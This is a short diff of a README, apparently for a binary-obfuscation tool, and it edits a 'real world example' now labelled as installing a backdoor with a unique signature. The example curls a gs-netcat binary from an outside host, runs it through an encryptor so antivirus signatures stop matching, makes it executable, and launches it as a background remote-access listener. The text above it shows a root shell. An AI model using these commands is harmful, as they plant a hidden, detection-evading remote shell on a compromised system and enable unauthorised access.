@@ -37,10 +37,10 @@ Enter Password: foobar
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Real world example (install gs-netcat with a different signature):
+Real world example (install a backdoor with a unique signature):
 ```shell
 curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m) | ./bincrypter.sh - >gsnc
-chmod +s gsnc
+chmod +x gsnc
 GS_ARGS="-ilD -s ChangeMe" ./gsnc
 ```
 
